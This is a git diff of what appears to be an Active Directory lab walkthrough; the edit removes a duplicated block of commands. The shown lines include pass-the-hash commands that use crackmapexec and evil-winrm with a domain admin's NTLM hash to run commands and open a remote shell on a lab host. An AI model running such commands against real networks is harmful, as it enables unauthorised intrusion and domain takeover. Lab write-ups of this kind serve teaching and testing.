@@ -156,13 +156,6 @@ HOGWARTS\severus.snape is a domain admin user. <br>
 # crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1 -x whoami
 # evil-winrm -i 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
 ```
-If NTLM authentication is disabled,
-
-```console
-# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
-# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1 -x whoami
-# evil-winrm -i 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
-```
 If NTLM authentication is disabled 
 
 ```console
